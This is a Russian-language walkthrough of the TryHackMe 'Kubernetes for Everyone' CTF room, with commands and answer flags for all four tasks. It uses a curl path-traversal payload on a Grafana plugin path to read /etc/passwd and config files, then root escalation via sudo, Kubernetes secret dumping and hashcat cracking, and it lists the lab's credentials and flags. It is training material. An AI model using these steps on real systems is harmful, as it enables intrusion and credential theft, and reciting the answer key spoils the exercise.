[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)

# Комната [Kubernetes for Everyone](https://tryhackme.com/r/room/kubernetesforyouly) 

Всего 4 задания:
## Задание 1
Чтобы получить доступ к кластеру, вам нужно знать местоположение кластера K8s и иметь учетные данные для доступа к 
нему. Скомпрометируйте кластер и удачи.

Используйте Nmap, чтобы найти открытые порты и закрепиться, эксплуатируя уязвимую службу. Если вы новичок в Nmap, 
загляните в комнату Nmap.

### Ответьте на вопросы ниже
Найти имя пользователя?
```commandline
sudo nmap -sV -sC -T4 <IP>
gobuster dir -u http://<IP>:3000 --exclude-length 28034 -t 100 -r -x php,txt,html -w dir-med.txt 2>/dev/null
curl http://<IP>:3000/public/plugins/alertlist/../../../../../../../../../../etc/passwd --path-as-is
curl http://<IP>:3000/public/plugins/alertlist/../../../../../../../../../../etc/grafana/grafana.ini --path-as-is > test.txt
echo "OZQWO4TBNZ2A====" | base32 -d
```
```commandline
vagrant
```
Нашли пароль?

```commandline
hereiamatctf907
```

## Задание 2
Если хочешь сохранить секрет, ты должен скрыть его и от себя . Найди секрет!

### Ответьте на вопросы ниже
Какой секрет вы нашли?
```commandline
ssh vagrant@<IP>
# hereiamatctf907
sudo -l
sudo bash
ps aux
k0s kubectl get secret
k0s kubectl edit secret k8s.authentication
echo "VEhNe3llc190aGVyZV8kc19ub18kZWNyZXR9" | base64 -d
```
```commandline
THM{yes_there_$s_no_$ecret}
```

## Задание 3
Модули  — это наименьшие развертываемые вычислительные единицы, которые можно создавать и управлять в Kubernetes . 

Pod  также  разделяет хранилище. Перечислите место хранения, совместно используемое Pod, и найдите флаг!

### Ответьте на вопросы ниже
Что такое флаг громкости?
```commandline
k0s kubectl get pods -A
cd /var/lib/k0s/containerd/io.containerd.snapshotter.v1.overlayfs/snapshots/38/fs/home/ubuntu/jokes
ls
git log --pretty=oneline
git show 4b2c2d74b31d922252368c112a3907c5c1cf1ba3
```
```commandline
THM{this_joke_is_cold_joke}
```

## Задание 4
Вы вошли в шорт-лист и вас ждут собеседования в компании FANG! Найдите секрет, который остался позади.

Надеюсь, вы многому научились, пройдя через испытания. Большое спасибо за то, что сделали мою первую комнату, и я 
хочу лично поблагодарить kiransau. Не стесняйтесь оставлять отзывы через  Twitter.

### Ответьте на вопросы ниже
В чем секрет интервью FANG?
```commandline
k0s kubectl get job -n internship
k0s kubectl get job -n internship -o json
vim hash.txt
hashcat -m 100 -w 3 -D 1,2 hash.txt /usr/share/wordlists/rockyou.txt
```
```commandline
chidori
```

[>> вернуться на главную страницу](https://github.com/BEPb/tryhackme/blob/master/README.md)